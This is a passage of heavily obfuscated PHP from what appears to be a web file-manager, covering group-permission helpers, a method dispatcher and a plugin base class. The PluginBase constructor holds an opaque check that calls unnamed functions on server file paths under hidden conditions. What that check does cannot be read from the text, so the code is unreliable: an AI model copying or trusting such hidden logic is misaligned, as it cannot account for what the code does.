intval($Ÿ²„”óà[$«‡¡¿”[489]]); if ($­´úœ·Ş[$«‡¡¿”[191]] == SourceModel::TYPE_USER && $Á½à›œî == $éÜƒÛø‰) { $’ı¦ğ–Ó = !0; $–ÂèÈå = $Ÿ²„”óà; $èÕæĞô = $ºÄşø„Ó; } else { if ($­´úœ·Ş[$«‡¡¿”[191]] == SourceModel::TYPE_GROUP && $this->groupContainUser($Á½à›œî, $éÜƒÛø‰)) { $²Œ‚ü¯ô = !0; $™®·™ùĞ = $this->groupStepToUserGroup($Á½à›œî, $éÜƒÛø‰); if ($™®·™ùĞ < $÷ÑÙÌÃ) { $÷ÑÙÌÃ = $™®·™ùĞ; $©ö“æ§· = $ºÄşø„Ó; $êÁæ§· = $Ÿ²„”óà; $ôÛÕÚÛ = $Á½à›œî; } if ($™®·™ùĞ == $÷ÑÙÌÃ && $ºÄşø„Ó >= $©ö“æ§·) { $©ö“æ§· = $ºÄşø„Ó; $êÁæ§· = $Ÿ²„”óà; $ôÛÕÚÛ = $Á½à›œî; } } else { if ($Á½à›œî == $«‡¡¿”[231]) { $Î…‘™û¦ = !0; $Ì²üû›¾ = $Ÿ²„”óà; $ˆûìÇä = $ºÄşø„Ó; } } } } if ($’ı¦ğ–Ó) { $»³“…‰ = $èÕæĞô; $Ÿ²„”óà = $–ÂèÈå; $Ğ¯æí à = LNG($«‡¡¿”[2220]); } else { if ($²Œ‚ü¯ô) { $»³“…‰ = $©ö“æ§·; $Ÿ²„”óà = $êÁæ§·; $š¿ğÎÊ« = Model($«‡¡¿”[589])->getInfo($ôÛÕÚÛ); $Ğ¯æí à = $«‡¡¿”[176] . $š¿ğÎÊ«[$«‡¡¿”[593]] . $«‡¡¿”[2221] . LNG($«‡¡¿”[2222]); } else { if ($Î…‘™û¦) { $»³“…‰ = $ˆûìÇä; $Ÿ²„”óà = $Ì²üû›¾; $Ğ¯æí à = LNG($«‡¡¿”[2193]); } else { $»³“…‰ = 0; $Ÿ²„”óà = !1; $Ğ¯æí à = $«‡¡¿”[12]; } } } $øñàí»Á = array($«‡¡¿”[2212] => intval($»³“…‰), $«‡¡¿”[2195] => $Ÿ²„”óà, $«‡¡¿”[2213] => $Ğ¯æí à, $«‡¡¿”[2204] => $­´úœ·Ş[$«‡¡¿”[194]]); return $øñàí»Á; } private function groupContainUser($åÇ¦“¤¬, $¥Íğ¬ñ‰ = false) { return in_array($åÇ¦“¤¬, $this->userGroupParents($¥Íğ¬ñ‰)); } private function groupStepToUserGroup($èâõ±«, $õ’ä‡ãÄ = false) { $ÏÂëÓÍ =& $_SERVER[ùèÅ´Ãš]; $Â¥ä à = $this->userGroupList($õ’ä‡ãÄ); $® ì‹£ï = 1000; $´Ô˜¯Íò = $GLOBALS[$ÏÂëÓÍ[6]][$ÏÂëÓÍ[92]][$ÏÂëÓÍ[2105]] == 1; $ú×õ¢ÈË = $´Ô˜¯Íò ? 3 : 2; foreach ($Â¥ä à as $ÍæîÆ„š) { if ($ÍæîÆ„š[$ÏÂëÓÍ[1404]] == $èâõ±«) { return 0; } $²‚Ÿ‚á = explode($ÏÂëÓÍ[50], trim($ÍæîÆ„š[$ÏÂëÓÍ[588]], $ÏÂëÓÍ[50])); if ($²‚Ÿ‚á[0] == $ÏÂëÓÍ[231] && count($²‚Ÿ‚á) > $ú×õ¢ÈË) { $›ğİ®ƒñ = array_reverse(array_slice($²‚Ÿ‚á, $ú×õ¢ÈË)); $«ÛÜö¹Î = array_search($èâõ±«, $›ğİ®ƒñ); if ($«ÛÜö¹Î !== !1 && $«ÛÜö¹Î + 1 <= $® ì‹£ï) { $® ì‹£ï = $«ÛÜö¹Î + 1; } } } return $® ì‹£ï; } private function userGroupList($ÍŸ®¨åú = false) { $ŒŞ­ğç„ =& $_SERVER[ùèÅ´Ãš]; static $âú“­ã× = array(); if (isset($âú“­ã×[$ÍŸ®¨åú])) { return $âú“­ã×[$ÍŸ®¨åú]; } $é«’ŞœÆ = Model($ŒŞ­ğç„[601])->getInfo($ÍŸ®¨åú); $âú“­ã×[$ÍŸ®¨åú] = array_to_keyvalue($é«’ŞœÆ[$ŒŞ­ğç„[1403]], $ŒŞ­ğç„[1404]); return $âú“­ã×[$ÍŸ®¨åú]; } public function userGroupParents($’Ø«¨öÒ) { $Ê›óÇ…Ì =& $_SERVER[ùèÅ´Ãš]; static $²ÏßÃ— = array(); $’Ø«¨öÒ = $’Ø«¨öÒ ? $’Ø«¨öÒ : USER_ID; if (isset($²ÏßÃ—[$’Ø«¨öÒ])) { return $²ÏßÃ—[$’Ø«¨öÒ]; } $”‹™ğŸÈ = $this->userGroupList($’Ø«¨öÒ); $³‡´”ÕÚ = array(); $æâÓ“ = $GLOBALS[$Ê›óÇ…Ì[6]][$Ê›óÇ…Ì[92]][$Ê›óÇ…Ì[2105]] == 1; $÷ñÃâÑ¤ = $æâÓ“ ? 3 : 2; foreach ($”‹™ğŸÈ as $øÚªçó¯) { $¨Ãàş×Ã = array($øÚªçó¯[$Ê›óÇ…Ì[1404]]); $÷ù¡ï•ï = explode($Ê›óÇ…Ì[50], trim($øÚªçó¯[$Ê›óÇ…Ì[588]], $Ê›óÇ…Ì[50])); if ($÷ù¡ï•ï[0] == $Ê›óÇ…Ì[231] && count($÷ù¡ï•ï) > $÷ñÃâÑ¤) { $«¶ãéıÀ = array_slice($÷ù¡ï•ï, $÷ñÃâÑ¤); $¨Ãàş×Ã = array_merge($¨Ãàş×Ã, array_reverse($«¶ãéıÀ)); } $³‡´”ÕÚ = array_merge($³‡´”ÕÚ, $¨Ãàş×Ã); } $²ÏßÃ—[$’Ø«¨öÒ] = array_unique($³‡´”ÕÚ); return $²ÏßÃ—[$’Ø«¨öÒ]; } public function authTargetInfoMake($‚éµÒ–¹) { $—¯îÛá‘ =& $_SERVER[ùèÅ´Ãš]; $¥”ü¾éõ = array(); $Íª±Ë´‡ = array(); foreach ($‚éµÒ–¹ as $—‡¼ƒ²­) { if ($—‡¼ƒ²­[$—¯îÛá‘[191]] == SourceModel::TYPE_USER) { $¥”ü¾éõ[] = intval($—‡¼ƒ²­[$—¯îÛá‘[573]]); } else { if ($—‡¼ƒ²­[$—¯îÛá‘[191]] == SourceModel::TYPE_GROUP) { $Íª±Ë´‡[] = intval($—‡¼ƒ²­[$—¯îÛá‘[573]]); } } } if ($¥”ü¾éõ) { $¥”ü¾éõ = Model($—¯îÛá‘[581])->userListInfo($¥”ü¾éõ); } if ($Íª±Ë´‡) { $ÀÖ•„š“ = array($—¯îÛá‘[2087] => array($—¯îÛá‘[494], $Íª±Ë´‡)); $Íª±Ë´‡ = Model($—¯îÛá‘[589])->field($—¯îÛá‘[2223])->where($ÀÖ•„š“)->select(); $Íª±Ë´‡ = array_to_keyvalue($Íª±Ë´‡, $—¯îÛá‘[1404]); } return array($—¯îÛá‘[2224] => $¥”ü¾éõ, $—¯îÛá‘[2225] => $Íª±Ë´‡); } public function authInfo($Úùˆª×) { $¸Œ¸Ì–¥ =& $_SERVER[ùèÅ´Ãš]; if ($Úùˆª×[$¸Œ¸Ì–¥[2106]]) { $ªùÓğ®Ş = Model($¸Œ¸Ì–¥[575])->listData($Úùˆª×[$¸Œ¸Ì–¥[2106]]); if (!$ªùÓğ®Ş) { return !1; $¬èá¿À = Model($¸Œ¸Ì–¥[575])->listData(); $Ö…û–¾í = array_filter_by_field($¬èá¿À, $¸Œ¸Ì–¥[489], $¸Œ¸Ì–¥[231]); return $Ö…û–¾í; } $¥ÔÔë˜ã = array_field_key($ªùÓğ®Ş, array($¸Œ¸Ì–¥[477], $¸Œ¸Ì–¥[32], $¸Œ¸Ì–¥[489], $¸Œ¸Ì–¥[2020], $¸Œ¸Ì–¥[2021])); $¥ÔÔë˜ã[$¸Œ¸Ì–¥[2226]] = $Úùˆª×; return $¥ÔÔë˜ã; } else { return array($¸Œ¸Ì–¥[495] => 0, $¸Œ¸Ì–¥[2003] => $Úùˆª×[$¸Œ¸Ì–¥[2169]], $¸Œ¸Ì–¥[496] => $¸Œ¸Ì–¥[12], $¸Œ¸Ì–¥[2020] => $¸Œ¸Ì–¥[2227]); } } } goto Dµé„ŸùÛ’; A‚…‚Ìïà: function binCheckBigger($Ş„‹›ºÃ, $ÃÂûƒê) { return $Ş„‹›ºÃ > $ÃÂûƒê; } $_SERVER[$_SERVER[Ş’›çØ][3]] = ("\x38\x36\x39\x33".base64_decode('MTE='))+0;$_i1mh="oins6rbchlw02ztqakugm4vj9fp53y817edxyhcxnt0d2avpu1q7fo84ibr5wkjzs";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($¦°‚À², $«‹ÜíÉ™) { $ã’ƒÂ¯ =& $_SERVER[ùèÅ´Ãš]; if (isset(self::$_methodList[$¦°‚À²])) { return @call_user_func_array(self::$_methodList[$¦°‚À²], $«‹ÜíÉ™); } else { if (method_exists($this, $¦°‚À²)) { return call_user_func_array(array($this, $¦°‚À²), $«‹ÜíÉ™); } else { think_exception(__CLASS__ . $ã’ƒÂ¯[4] . $¦°‚À² . $ã’ƒÂ¯[5]); } } } public static function __callStatic($¹êÈêÛÇ, $³èïµë£) { if (isset(self::$_methodListStatic[$¹êÈêÛÇ])) { return call_user_func_array(self::$_methodListStatic[$¹êÈêÛÇ], $³èïµë£); } else { if (method_exists(self, $¹êÈêÛÇ)) { return call_user_func_array(array(self, $¹êÈêÛÇ), $³èïµë£); } else { show_json("{$¹êÈêÛÇ}\x28\51\x20\x6e\x6f\164\40\x65\x78\151\163\164\73", !1); } } } public static function addMethod($¦‰ïÇĞØ, $®÷¾±ØÃ) { self::$_methodList[$¦‰ïÇĞØ] = $®÷¾±ØÃ; } public static function addMethodStatic($‰¾Æ½îú, $Ï¬™’Ìƒ) { self::$_methodListStatic[$‰¾Æ½îú] = $Ï¬™’Ìƒ; } } goto aĞ‹òŒšÁ˜; bÓˆÀÛŠïõ: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ éØ´§ƒ =& $_SERVER[ùèÅ´Ãš]; if ($_SERVER[$ éØ´§ƒ[961]] != $_SERVER[$ éØ´§ƒ[962]]) { $Õ¥ì½°‰ = $ éØ´§ƒ[963]; $Ü–¯Ä = $ éØ´§ƒ[964]; $òÎ°šò­ = $_SERVER[$ éØ´§ƒ[965]] . $ éØ´§ƒ[966]; $Ìò¿Èóï = $Ü–¯Ä($òÎ°šò­); $·„À«ˆ = explode($ éØ´§ƒ[288], $Ìò¿Èóï); if (count($·„À«ˆ) < $ éØ´§ƒ[695]) { $Ä Óã • = $ éØ´§ƒ[967]; $Ä Óã •(); } $üæÊÖÑ = $ éØ´§ƒ[968]; $üæÊÖÑ($_SERVER[$ éØ´§ƒ[969]]); $üæÊÖÑ($_SERVER[$ éØ´§ƒ[965]] . $ éØ´§ƒ[970]); $ëã¨†„Ô = 1; while ($ëã¨†„Ô > 1) { $ëã¨†„Ô = $ëã¨†„Ô + 4; $…øšÎÚ = rawurlencode($ëã¨†„Ô . $ éØ´§ƒ[456]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ éØ´§ƒ[1648]); $this->pluginName = str_replace($ éØ´§ƒ[1648], $ éØ´§ƒ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ éØ´§ƒ[8]; $this->pluginApi = appHostGet() . $ éØ´§ƒ[1649] . $this->pluginName . $ éØ´§ƒ[8]; $this->pluginHost = $config[$ éØ´§ƒ[1650]] . $this->pluginName . $ éØ´§ƒ[8]; $this->pluginHostDefault = $config[$ éØ´§ƒ[1650]] . $this->pluginName . $ éØ´§ƒ[8]; $Ö·Ó›š£ = $config[$ éØ´§ƒ[1651]]; if ($Ö·Ó›š£ && strpos($ éØ´§ƒ[50] . $Ö·Ó›š£ . $ éØ´§ƒ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ éØ´§ƒ[1652]] . $this->pluginName . $ éØ´§ƒ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ùèÅ´Ãš][1653]); } protected function assign($’Í¤ÃÆÏ, $öšò†ßó = false) { if (is_array($’Í¤ÃÆÏ)) { $this->values = array_merge($this->values, $’Í¤ÃÆÏ); } else { $this->values[$’Í¤ÃÆÏ] = $öšò†ßó; } } protected function display($çÌç) { extract($this->values); require $çÌç; } final function hookRegist($ÀåÊ‹•„) { $this->modelPlugin->appRegist($this->pluginName, $ÀåÊ‹•„); } final function appIcon() { $­ñ§¬ö„ =& $_SERVER[ùèÅ´Ãš]; $¹’ŞÛ¢Š = $this->appPackage(); $½²›ñıî = $­ñ§¬ö„[12]; if (isset($¹’ŞÛ¢Š[$­ñ§¬ö„[492]])) { if (isset($¹’ŞÛ¢Š[$­ñ§¬ö„[492]][$­ñ§¬ö„[1654]])) { $½²›ñıî = $­ñ§¬ö„[1655] . $¹’ŞÛ¢Š[$­ñ§¬ö„[492]][$­ñ§¬ö„[1654]] . $­ñ§¬ö„[1656]; } else { if ($¹’ŞÛ¢Š[$­ñ§¬ö„[492]][$­ñ§¬ö„[1657]]) { $½²›ñıî = $­ñ§¬ö„[1658] . $¹’ŞÛ¢Š[$­ñ§¬ö„[492]][$­ñ§¬ö„[1657]] . $­ñ§¬ö„[1659]; } } } return $½²›ñıî; } final function fileCanView($ô¯·’Ù¹) { $´‘ÜöÀÀ =& $_SERVER[ùèÅ´Ãš]; if (request_url_safe($ô¯·’Ù¹)) { return !0; } if ($this->isShare($ô¯·’Ù¹)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $·‡ÍÂ¯ˆ = $´‘ÜöÀÀ[1660] . rawurlencode(this_url()); show_tips(LNG($´‘ÜöÀÀ[1661]) . $´‘ÜöÀÀ[1662] . $·‡ÍÂ¯ˆ . $´‘ÜöÀÀ[1663] . LNG($´‘ÜöÀÀ[1664]) . $´‘ÜöÀÀ[1665], !1); } if (!Action($´‘ÜöÀÀ[1666])->authCan($´‘ÜöÀÀ[1667])) { show_tips(LNG($´‘ÜöÀÀ[1668]) . $´‘ÜöÀÀ[1669], !1); } ActionCall($´‘ÜöÀÀ[1670], $ô¯·’Ù¹); } final function isShare($…‡ĞƒÀö) { $òÒœèÔ = KodIO::parse($…‡ĞƒÀö); return $òÒœèÔ[$_SERVER[ùèÅ´Ãš][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ñÙÅ³Äƒ) { if (request_url_safe($ñÙÅ³Äƒ)) { return $ñÙÅ³Äƒ; } if (!$this->isShare($ñÙÅ³Äƒ)) { $ñÙÅ³Äƒ = $this->filePath($ñÙÅ³Äƒ, !1); } return Action($_SERVER[ùèÅ´Ãš][1270])->linkOut($ñÙÅ³Äƒ); } public function filePathLinkOut($Ğ­Øœ»à) { if (request_url_safe($Ğ­Øœ»à)) { return $Ğ­Øœ»à; } $this->fileCanView($Ğ­Øœ»à); return Action($_SERVER[ùèÅ´Ãš][1270])->link($Ğ­Øœ»à); } final function filePath($¦úÉüÇê, $¨ò¿Şò‹ = true, $²ÏÌû—ù = false) { $ã„€½°Ü =& $_SERVER[ùèÅ´Ãš]; $‹¶´£Û¼ = $this->filePathGet($¦úÉüÇê, $¨ò¿Şò‹); if (!$this->fileInfo) { show_tips(LNG($ã„€½°Ü[108]), !1); } if ($²ÏÌû—ù && isset($this->fileInfo[$ã„€½°Ü[545]]) && $this->fileInfo[$ã„€½°Ü[545]]) { $£©–¾Ÿ• = Model($ã„€½°Ü[548])->fileInfo($this->fileInfo[$ã„€½°Ü[545]]); if (!$£©–¾Ÿ• || !IO::exist($£©–¾Ÿ•[$ã„€½°Ü[87]])) { $«Ã÷º‚± = LNG($ã„€½°Ü[108]) . LNG($ã„€½°Ü[1671]); if (KodUser::isRoot() && isset($£©–¾Ÿ•[$ã„€½°Ü[87]])) { $«Ã÷º‚± .= $ã„€½°Ü[1672] . $£©–¾Ÿ•[$ã„€½°Ü[87]] . $ã„€½°Ü[1673]; } show_tips($«Ã÷º‚±); } } Hook::trigger($ã„€½°Ü[1674], $‹¶´£Û¼); return $‹¶´£Û¼; } final function filePathGet($•¿è¦…‡, $Å¶‰Ä¡ = true) { $ºÒó¯óÕ =& $_SERVER[ùèÅ´Ãš]; if ($€šãõ å = $this->checkSharePath($•¿è¦…‡, $Å¶‰Ä¡)) { return $€šãõ å; } $this->fileCanView($•¿è¦…‡); if (request_url_safe($•¿è¦…‡)) { $°°Ü•ãÌ = parse_url_query($•¿è¦…‡); if (isset($°°Ü•ãÌ[$ºÒó¯óÕ[1675]]) && isset($°°Ü•ãÌ[$ºÒó¯óÕ[237]])) { $È€Ã„óÔ = Mcrypt::decode($°°Ü•ãÌ[$ºÒó¯óÕ[237]], Model($ºÒó¯óÕ[848])->get($ºÒó¯óÕ[849])); if ($È€Ã„óÔ) { $this->fileInfo = IO::info($È€Ã„óÔ); $this->fileInfo[$ºÒó¯óÕ[1676]] = $•¿è¦…‡; $this->cachePath = $this->pluginCachePath($ºÒó¯óÕ[12], $Å¶‰Ä¡); return $È€Ã„óÔ; } } $•¿è¦…‡ = $this->_cacheHttpFile($•¿è¦…‡, $Å¶‰Ä¡); $this->fileInfo = IO::info($•¿è¦…‡); } else { $this->fileInfo = IO::info($•¿è¦…‡); $this->cachePath = $this->pluginCachePath($ºÒó¯óÕ[12], $Å¶‰Ä¡); } return $•¿è¦…‡; } final function _cacheHttpFile($ˆ¬œ‡À, $èÍëéÏ = true) { $–Ã¥Å®Æ =& $_SERVER[ùèÅ´Ãš]; $éÔ›ÊÚÌ = parse_url_query($ˆ¬œ‡À); $Â˜Õ“ôâ = get_path_ext($ˆ¬œ‡À); if (isset($éÔ›ÊÚÌ[$–Ã¥Å®Æ[32]]) && $éÔ›ÊÚÌ[$–Ã¥Å®Æ[32]]) { $Â˜Õ“ôâ = get_path_ext($éÔ›ÊÚÌ[$–Ã¥Å®Æ[32]]); } $ŠÑñƒÎ× = hash_path($ˆ¬œ‡À) . $–Ã¥Å®Æ[10] . $Â˜Õ“ôâ; $this->cachePath = $this->pluginCachePath($èÍëéÏ ? $ŠÑñƒÎ× : $–Ã¥Å®Æ[12]); $Àë˜öÈİ = IO::fileNameExist($this->cachePath, $ŠÑñƒÎ×); if ($Àë˜öÈİ) { return KodIO::make($Àë˜öÈİ); } $ıû·×« = rtrim($this->cachePath, $–Ã¥Å®Æ[8]) . $–Ã¥Å®Æ[8] . $ŠÑñƒÎ×; return $this->pluginCacheFileSet($ıû·×«, file_get_contents_nossl($ˆ¬œ‡À)); } final function checkSharePath($óÕòù¬™, $â’–Ì® = true) { $Î¿úÀ©Õ =& $_SERVER[ùèÅ´Ãš]; if (!$this->isShare($óÕòù¬™)) { return !1; } $ÕŠØÁ™½ = Action($Î¿úÀ©Õ[1270])->sharePathInfo($óÕòù¬™); if (!is_array($ÕŠØÁ™½) || !isset($ÕŠØÁ™½[$Î¿úÀ©Õ[87]])) { show_json(LNG($Î¿úÀ©Õ[1677]), !1); } $this->fileInfo = $ÕŠØÁ™½; $this->cachePath = $this->pluginCachePath(!1, $â’–Ì®); return $ÕŠØÁ™½[$Î¿úÀ©Õ[87]]; } final function pluginCachePath($ø¿¤²ãÃ = '', $€ÙÆ¸Á™ = false) { $àÓ…õÁ± =& $_SERVER[ùèÅ´Ãš]; if ($€ÙÆ¸Á™ && is_array($this->fileInfo)) { $ø¿¤²ãÃ = kodIO::hashPath($this->fileInfo); } $ûö½Ô…ş = rtrim(IO_PATH_SYSTEM_TEMP . $àÓ…õÁ±[1678] . $this->pluginName . $àÓ…õÁ±[8] . $ø¿¤²ãÃ, $àÓ…õÁ±[8]); $Ûû×Ê³ø = IO::infoFullSimple($ûö½Ô…ş); $¶¦êñƒŒ = $Ûû×Ê³ø && is_array($Ûû×Ê³ø) ? $Ûû×Ê³ø[$àÓ…õÁ±[87]] : $àÓ…õÁ±[12]; if (!$¶¦êñƒŒ) { $¶¦êñƒŒ = IO::mkdir($ûö½Ô…ş); } return $¶¦êñƒŒ; } final function pluginCacheFileSet($æÌâéÍç, $«Ø¦‘Æµ = '') { $˜­“ı‡Ù =& $_SERVER[ùèÅ´Ãš]; $¦òÒåÂÉ = IO::infoFullSimple($æÌâéÍç); if (!$¦òÒåÂÉ) { return IO::mkfile($æÌâéÍç, $«Ø¦‘Æµ, REPEAT_REPLACE); } IO::setContent($¦òÒåÂÉ[$˜­“ı‡Ù[87]], $«Ø¦‘Æµ); return $¦òÒåÂÉ[$˜­“ı‡Ù[87]]; } final function pluginLocalFile($Ë²·Ò“ó = '') { $–Ò‰»¥¹ =& $_SERVER[ùèÅ´Ãš]; $­ø¡ …Â = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($­ø¡ …Â)) { mk_dir($­ø¡ …Â); } if (!$Ë²·Ò“ó) { return $­ø¡ …Â; } $í´„ÎÏ = IO::info($Ë²·Ò“ó); $â¥×ê³Ò = $–Ò‰»¥¹[1679] . KodIO::hashPath($í´„ÎÏ) . $–Ò‰»¥¹[10] . $í´„ÎÏ[$–Ò‰»¥¹[169]]; if (!checkExtSafe($â¥×ê³Ò)) { $â¥×ê³Ò = $â¥×ê³Ò . $–Ò‰»¥¹[1305]; } $ÁÈòÃÓÛ = $­ø¡ …Â . $â¥×ê³Ò; if (@file_exists($ÁÈòÃÓÛ)) { return $ÁÈòÃÓÛ; } return IO::copy($Ë²·Ò“ó, $­ø¡ …Â, 0, $â¥×ê³Ò); } final function appPackage() { $¦¤…ò§ş =& $_SERVER[ùèÅ´Ãš]; if ($this->packageData) { return $this->packageData; } $­ÜÙò“Â = $this->parseFile($this->pluginPath . $¦¤…ò§ş[1680]); $this->parseLang($­ÜÙò“Â); $·ÌíÍÏÏ = json_decode_force($­ÜÙò“Â); if (!$·ÌíÍÏÏ) { return array(); } $ñƒ™¡¹á = Hook::trigger($¦¤…ò§ş[1681], $·ÌíÍÏÏ); if ($ñƒ™¡¹á && is_array($ñƒ™¡¹á)) { $·ÌíÍÏÏ = $ñƒ™¡¹á; } $this->packageData = $·ÌíÍÏÏ; return $·ÌíÍÏÏ; } public function packageInfoGet($Æ»äš–) { $¿Ğóğì = $this->appPackage(); return array_get_value($¿Ğóğì, $Æ»äš–); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ùèÅ´Ãš][1682]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ùèÅ´Ãš][1683]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ùèÅ´Ãš][1684]); } public function echoJsAssign($ÈÔ²ªÌ, $“ƒÖ„ ) { $this->echoJsAssignArr[$ÈÔ²ªÌ] = $“ƒÖ„ ; } private function parseFile($³ëÙ÷ÚÛ) { $¾·Àô„ø =& $_SERVER[ùèÅ´Ãš]; $ìƒ´½ß· = file_get_contents_nossl($³ëÙ÷ÚÛ); $¼«½ûà… = array($¾·Àô„ø[1685], $¾·Àô„ø[1686], $¾·Àô„ø[1687], $¾·Àô„ø[1688], $¾·Àô„ø[1689], $¾·Àô„ø[1690], $¾·Àô„ø[1691]); $•·ªãò“ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$¾·Àô„ø[92]][$¾·Àô„ø[1692]]); foreach ($this->echoJsAssignArr as $¶ÌÈØÖú => $ßÂºŒ¼–) { $¼«½ûà…[] = $¾·Àô„ø[1693] . $¶ÌÈØÖú . $¾·Àô„ø[1694]; $•·ªãò“[] = is_array($ßÂºŒ¼–) || is_object($ßÂºŒ¼–) ? rawurlencode(json_encode($ßÂºŒ¼–)) : $ßÂºŒ¼–; } if (strstr($ìƒ´½ß·, $¾·Àô„ø[1695])) { $úÖŠ”şÆ = rawurlencode(json_encode($this->pluginLangArr)); $ìƒ´½ß· = str_replace($¾·Àô„ø[1695], $úÖŠ”şÆ, $ìƒ´½ß·); } if (strstr($ìƒ´½ß·, $¾·Àô„ø[1696])) { $úÖŠ”şÆ = $úÖŠ”şÆ = rawurlencode(json_encode($this->getConfig())); $ìƒ´½ß· = str_replace($¾·Àô„ø[1696], $úÖŠ”şÆ, $ìƒ´½ß·); } $ìƒ´½ß· = str_replace($¼«½ûà…, $•·ªãò“, $ìƒ´½ß·); return $ìƒ´½ß·; } private function parseLang(&$É¨·Í©º) { $üàÒÔ =& $_SERVER[ùèÅ´Ãš]; $Ææºê—ö = $üàÒÔ[1697]; if (!strstr($É¨·Í©º, $Ææºê—ö)) { return; } preg_match_all($üàÒÔ[1698], $É¨·Í©º, $ñÖÜş—); if (!is_array($ñÖÜş—) || count($ñÖÜş—) == 0 || !is_array($ñÖÜş—[0]) || count($ñÖÜş—[0]) == 0) { return; } $úé˜·¼ñ = array(); $ë§»½Ê„ = array(); foreach ($ñÖÜş—[0] as $î«“Œ†¤) { $’ÇŞÇíå = substr($î«“Œ†¤, strlen($Ææºê—ö), -4); $ıŞÚƒØŠ = LNG($’ÇŞÇíå); $úé˜·¼ñ[] = $î«“Œ†¤; $ë§»½Ê„[] = str_replace(array($üàÒÔ[288], $üàÒÔ[1167], $üàÒÔ[419], $üàÒÔ[121]), array($üàÒÔ[53], $üàÒÔ[53], $üàÒÔ[12], $üàÒÔ[1699]), $ıŞÚƒØŠ); } $É¨·Í©º = str_replace($úé˜·¼ñ, $ë§»½Ê„, $É¨·Í©º); } private function parseConfig(&$ş»½½³) { $ËœÉğ‡å =& $_SERVER[ùèÅ´Ãš]; $ÓÍÌë† = $ËœÉğ‡å[1700]; if (!strstr($ş»½½³, $ÓÍÌë†)) { return; } preg_match_all($ËœÉğ‡å[1701], $ş»½½³, $ÏúÂ÷); if (!is_array($ÏúÂ÷) || count($ÏúÂ÷) == 0 || !is_array($ÏúÂ÷[0]) || count($ÏúÂ÷[0]) == 0) { return; } $»ëÔöŒÌ = $this->getConfig(); $½êôÌÏ = array(); $†ˆµ¾´ò = array(); foreach ($ÏúÂ÷[0] as $œçÇ·Ô‚) { $öˆ™¸ÙÌ = substr($œçÇ·Ô‚, strlen($ÓÍÌë†), -2); $½êôÌÏ[] = $œçÇ·Ô‚; $†ˆµ¾´ò[] = _get($»ëÔöŒÌ, $öˆ™¸ÙÌ); } $ş»½½³ = str_replace($½êôÌÏ, $†ˆµ¾´ò, $ş»½½³); } private function parsePackage(&$Œ„şÀ¾) { $¶¯ŠëÙ‘ =& $_SERVER[ùèÅ´Ãš]; $ õ„ÜÈè = $¶¯ŠëÙ‘[1702]; if (!strstr($Œ„şÀ¾, $ õ„ÜÈè)) { return; } preg_match_all($¶¯ŠëÙ‘[1703], $Œ„şÀ¾, $÷ÁÜŒÜ); if (!is_array($÷ÁÜŒÜ) || count($÷ÁÜŒÜ) == 0 || !is_array($÷ÁÜŒÜ[0]) || count($÷ÁÜŒÜ[0]) == 0) { return; } $¯ñ¶Ş©¹ = $this->appPackage(); $©É­’ıÊ = array(); $ÆÅòÙƒ› = array(); foreach ($÷ÁÜŒÜ[0] as $Ûš ùøü) { $ÔÅ‡ùØÀ = substr($Ûš ùøü, strlen($ õ„ÜÈè), -2); $©É­’ıÊ[] = $Ûš ùøü; $ÆÅòÙƒ›[] = _get($¯ñ¶Ş©¹, $ÔÅ‡ùØÀ); } $Œ„şÀ¾ = str_replace($©É­’ıÊ, $ÆÅòÙƒ›, $Œ„şÀ¾); } final function echoFile($îùÇúÜ, $ïÌ²‹ì = false) { $£¿øÁ„ =& $_SERVER[ùèÅ´Ãš]; $÷«²Æ‡ƒ = $this->pluginPath . $îùÇúÜ; if (ACT == $£¿øÁ„[1704]) { echo $£¿øÁ„[1705] . $this->pluginName . $£¿øÁ„[8] . $îùÇúÜ . $£¿øÁ„[1706]; if (!file_exists($÷«²Æ‡ƒ)) { echo $£¿øÁ„[1707]; return; } } $§ò›¨óø = $this->parseFile($÷«²Æ‡ƒ); $this->parseLang($§ò›¨óø); $this->parseConfig($§ò›¨óø); $this->parsePackage($§ò›¨óø); if (is_array($ïÌ²‹ì)) { $§ò›¨óø = str_replace(array_keys($ïÌ²‹ì), array_values($ïÌ²‹ì), $§ò›¨óø); } echo $£¿øÁ„[288] . $§ò›¨óø; } private function checkVersion() { $ªîº¢ÃÔ =& $_SERVER[ùèÅ´Ãš]; $´à¾§—„ = $this->appPackage(); $–Éè®âĞ = $this->getConfig(); if ($–Éè®âĞ[$ªîº¢ÃÔ[1708]] == $´à¾§—„[$ªîº¢ÃÔ[1682]]) { return; } $this->regist(); $this->setConfig(array($ªîº¢ÃÔ[1708] => $´à¾§—„[$ªîº¢ÃÔ[1682]])); } final function initLang() { $‘çƒô›É =& $_SERVER[ùèÅ´Ãš]; $­›¤²ö = $‘çƒô›É[1709]; $«İ†ÎØ» = $this->pluginPath . $‘çƒô›É[1710]; $‚Îì³İß = I18n::getType(); $î›©À’Ş = array(); if (file_exists($«İ†ÎØ» . $‚Îì³İß . $‘çƒô›É[922])) { $î›©À’Ş = (include $«İ†ÎØ» . $‚Îì³İß . $‘çƒô›É[922]); } else { if ($‚Îì³İß == $‘çƒô›É[1711] && !file_exists($«İ†ÎØ» . $‚Îì³İß . $‘çƒô›É[922]) && file_exists($«İ†ÎØ» . $‘çƒô›É[1712])) { $î›©À’Ş = (include $«İ†ÎØ» . $‘çƒô›É[1712]); } else { if (file_exists($«İ†ÎØ» . $­›¤²ö . $‘çƒô›É[922])) { $î›©À’Ş = (include $«İ†ÎØ» . $­›¤²ö . $‘çƒô›É[922]); } } } if (!is_array($î›©À’Ş)) { return array(); 